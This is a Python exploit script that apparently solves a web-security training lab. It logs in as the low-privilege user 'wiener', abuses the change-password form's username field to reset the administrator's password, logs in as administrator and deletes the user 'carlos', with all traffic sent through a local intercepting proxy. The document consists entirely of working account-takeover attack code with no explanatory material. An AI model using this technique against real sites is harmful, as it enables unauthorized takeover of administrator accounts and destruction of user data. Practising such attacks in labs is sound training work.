#!/usr/bin/env python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def change_password(s, url, username, new_password):
    print(f"[*] Changing password for {username}...")
    account_page = url + "/my-account"
    csrf = get_csrf_token(s, account_page)
    data = {"csrf": csrf, "username": username, "new-password-1": new_password, "new-password-2": new_password}
    r = s.post(url + "/my-account/change-password", data=data, verify=False, proxies=proxies, timeout=10)
    if "Password changed successfully" in r.text:
        return True
    return False

def delete_carlos(s, url):
    print("[*] Deleting carlos...")
    r = s.get(url + "/admin/delete?username=carlos", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Carlos deleted - Lab solved!")
        return True
    print("[-] Failed to delete carlos")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    if not change_password(s, url, "administrator", "test"):
        print("[-] Password change failed")
        return
    print("[+] Administrator password changed to: test")

    s = requests.Session()
    if not login(s, url, "administrator", "test"):
        print("[-] Admin login failed")
        return
    print("[+] Logged in as administrator")

    delete_carlos(s, url)

if __name__ == "__main__":
    main()